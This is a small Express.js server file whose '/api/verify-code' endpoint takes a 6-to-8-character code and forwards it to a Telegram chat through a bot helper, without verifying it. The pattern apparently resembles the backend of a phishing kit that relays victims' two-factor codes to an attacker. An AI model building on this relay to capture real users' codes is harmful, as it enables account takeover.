const express = require('express');
const bodyParser = require('body-parser');
const { send2FACode } = require('./bot');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/api/verify-code', (req, res) => {
    const { code, chatId } = req.body;
    if (code.length >= 6 && code.length <= 8) {
        send2FACode(code, chatId);
        res.status(200).send({ message: 'Code sent to Telegram.' });
    } else {
        res.status(400).send({ message: 'Invalid code length.' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});